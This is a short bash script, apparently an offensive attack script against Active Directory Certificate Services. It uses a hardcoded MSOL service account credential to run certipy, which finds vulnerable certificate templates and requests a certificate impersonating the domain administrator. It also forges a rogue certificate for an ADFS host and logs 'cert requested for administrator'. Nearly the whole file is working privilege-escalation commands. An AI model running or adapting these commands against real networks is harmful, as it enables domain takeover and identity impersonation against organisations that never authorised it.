#!/bin/bash
CA_HOST=ca01.corp.example
MSOL_USER="MSOL_0a1b2c3d4e5f"
MSOL_PASS='Qw7#fakeMsolSecretValue99'
certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt
certipy req -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -ca CORP-CA01 -template UserAuth -upn administrator@corp.example -target $CA_HOST -out admin_cert
openssl req -x509 -newkey rsa:2048 -nodes -keyout rogue.key -out rogue.crt -subj "/CN=adfs.corp.example" -days 365
cat <<EOT > 20250301_103300_notes.txt
cert requested for administrator
EOT
while IFS=$'\t' read -r acct host desc; do
  echo "checking $acct on $host"
done < 20250301_101910_step02_users.tsv
